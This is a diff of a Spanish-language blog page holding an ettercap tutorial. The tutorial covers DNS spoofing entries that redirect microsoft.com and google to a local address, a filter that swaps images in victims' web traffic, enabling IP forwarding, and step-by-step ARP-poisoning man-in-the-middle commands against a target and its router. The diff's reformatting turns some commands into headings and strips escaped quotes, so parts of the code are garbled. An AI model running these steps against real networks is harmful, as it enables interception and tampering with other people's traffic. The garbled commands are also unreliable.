@@ -94,7 +94,7 @@
   
 
 
-<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T18:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -115,121 +115,111 @@
 
 <p>$ cd ettercap-NG-0.7.3</p></blockquote>
 
-<pre><code>$ ./configure 
+<p>$ ./configure</p>
 
-$ make 
+<p>$ make</p>
 
-# make install 
-</code></pre>
+<h1>make install</h1>
 
 <blockquote><p>$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
 
 <p>modificar archivo de configuración:</p>
 
-<blockquote><p># nano /etc/etter.conf</p></blockquote>
+<blockquote><p>~# nano /etc/etter.conf</p></blockquote>
 
 <p>descomentar la linea:himne20-01-13 19:37Menos información</p>
 
-<blockquote><p># if you use iptables:</p></blockquote>
+<blockquote><p>~# if you use iptables:</p></blockquote>
 
 <p>redir_command_on = &#8220;iptables -t nat -A PREROUTING -i %iface -p tcp &#8211;dport %port -j REDIRECT &#8211;to-port %rport&#8221;</p>
 
 <p>Y modificar:</p>
 
-<blockquote><p># the command used by the remote_browser plugin</p></blockquote>
+<blockquote><p>~# the command used by the remote_browser plugin</p></blockquote>
 
 <p>remote_browser = &#8220;firefox -remote openurl(http://%host%url)&#8221;</p>
 
 <p>Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)</p>
 
-<blockquote><p># nano /usr/share/ettercap/etter.dns</p>
+<blockquote><p>~# nano /usr/share/ettercap/etter.dns</p>
 
-<p># 3  Modos de especificar la redirección a localhost</p></blockquote>
+<p>~# 3  Modos de especificar la redirección a localhost</p></blockquote>
 
-<pre><code>microsoft.com          A       192.168.1.2 
+<p>microsoft.com          A       192.168.1.2</p>
 
-*.microsoft.com        A       192.168.1.2 
+<p>*.microsoft.com        A       192.168.1.2</p>
 
-*google*               A       192.168.1.2
-</code></pre>
+<p><em>google</em>               A       192.168.1.2</p>
 
 <p>Para la sustitución de imagenes:</p>
 
-<blockquote><p># touch test2filter</p></blockquote>
+<blockquote><p>~# touch test2filter</p></blockquote>
 
 <p>Pegar:</p>
 
-<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
+<p>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {</p>
 
-replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
+<p>replace(&#8220;img src=&#8221;, &#8220;img src=&#8221;http://www.irongeek.com/images/jollypwn.png&#8221; &#8220;);</p>
 
-replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
+<p>replace(&#8220;IMG SRC=&#8221;, &#8220;img src=&#8221;http://www.irongeek.com/images/jollypwn.png&#8221; &#8220;);</p>
 
-msg("Filter ok.\n");
-</code></pre>
+<p>msg(&#8220;Filter ok.n&#8221;);</p>
 
 <p>Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:</p>
 
-<blockquote><p># cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
+<blockquote><p>~# cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
 
 <p>Si la respuesta no es 1, lanzar:</p>
 
-<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+<blockquote><p>~# echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
 
 <p>Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:</p>
 
-<blockquote><p># ettercap -C</p></blockquote>
+<blockquote><p>~# ettercap -C</p></blockquote>
 
 <p>Clicar en:</p>
 
-<pre><code>Sniff -&gt; Unifield sniffing 
-</code></pre>
+<p>Sniff -> Unifield sniffing</p>
 
 <p>Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:</p>
 
-<pre><code>Host -&gt; Scan for host 
-</code></pre>
+<p>Host -> Scan for host</p>
 
 <p>Para escanear la red. Para visionar las máquina activas obtenidas, clic en:</p>
 
-<pre><code>Hosts -&gt; Hosts List 
-</code></pre>
+<p>Hosts -> Hosts List</p>
 
 <p>Bajar con el cursor hasta la IP del router y pulsar la tecla &#8220;1&#8221;. Luego nos situamos sobre la IP del objetivo y pulsar la tecla &#8220;2&#8221; con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:</p>
 
-<pre><code>Mitm -&gt; Arp poisoning 
-</code></pre>
+<p>Mitm -> Arp poisoning</p>
 
 <p>Parameters, ponemos:</p>
 
-<pre><code>remote
-</code></pre>
+<p>remote</p>
 
 <p>Y arrancamos el sniffer:</p>
 
-<pre><code>Start -&gt; Start sniffing 
+<p>Start -> Start sniffing</p>
 
-Para observar las conexiones que realiza la máquina objetivo: 
+<p>Para observar las conexiones que realiza la máquina objetivo:</p>
 
-View -&gt; Connections 
+<p>View -> Connections</p>
 
-Para terminar el ataque: 
+<p>Para terminar el ataque:</p>
 
-Mitm -&gt; Stop mitm atack 
+<p>Mitm -> Stop mitm atack</p>
 
-Start -&gt; Stop Sniffing 
+<p>Start -> Stop Sniffing</p>
 
-Start -&gt; Exit
-</code></pre>
+<p>Start -> Exit</p>
 
 <p>Forma abreviada:</p>
 
-<pre><code># ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router 
+<h1>ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router</h1>
 
-O solo especificando la del router si se ataca toda la red: 
-</code></pre>
+<p>O solo especificando la del router si se ataca toda la red:</p>
 
-<blockquote><p># ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
+<blockquote><p>~# ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
 </div>
 
 
@@ -252,7 +242,7 @@ O solo especificando la del router si se ataca toda la red:
   
 
 
-<time datetime="2013-12-15T16:10:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T18:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
       
 
 
@@ -284,9 +274,9 @@ O solo especificando la del router si se ataca toda la red:
   
     <section>
 <h1>Número de entradas</h1>
-	<ul>
-	<li>1354</li>
-	</ul>
+        <ul>
+        <li>1354</li>
+        </ul>
 </section>
 <section>
   <h1>Añadidos/modificados</h1>
